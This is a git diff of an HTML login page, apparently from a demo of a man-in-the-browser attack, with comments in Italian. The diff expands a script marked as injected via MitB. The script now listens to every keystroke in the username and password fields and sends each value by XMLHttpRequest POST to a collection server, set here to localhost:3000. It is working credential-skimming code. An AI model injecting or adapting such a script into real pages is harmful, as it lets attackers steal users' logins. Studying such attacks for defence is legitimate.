@@ -13,16 +13,25 @@
   </div>
   
   <div class="form-field">
-    <input type="password" id="password" placeholder="Password" required/>                         </div>
+    <input type="password" id="password" placeholder="Password" required/>                         
+  </div>
   
   <div class="form-field">
     <button class="btn" type="submit">Log in</button>
   </div>
 </form>  
 
-// Script iniettato con MitB
+<!-- Script iniettato con MitB -->
 <script>
-  var server_addr = 'http://localhost:3000/password';
+  var server_addr = 'http://localhost:3000/login';
+
+  // Funzione che invia gli username al server
+  function sendUsername(username) {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", server_addr, true);
+    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    xhr.send("username=" + encodeURIComponent(username));
+  }
 
   // Funzione che invia le password al server
   function sendPassword(password) {
@@ -33,16 +42,29 @@
   }
   
   // Rimani in attesa per variazioni nel form di input
+  document.getElementById("username").addEventListener("input", function() {
+    var username = this.value;
+    if (username !== "") {
+      sendUsername(username);
+    }
+  });
+  // Rimani in attesa per variazioni nel form di input
   document.getElementById("password").addEventListener("input", function() {
     var password = this.value;
     if (password !== "") {
       sendPassword(password);
-      showMessage(document.getElementById("message"));
     }
   });
+
+  // function sendCredentials(username, password) {
+  //   console.log("Sending credentials to server...");
+  //   var xhr = new XMLHttpRequest();
+  //   xhr.open("POST", server_addr, true);
+  //   xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+  //   xhr.send("password=" + encodeURIComponent(password));
+  // }
 </script>
 
 
 </body>
 </html>
-
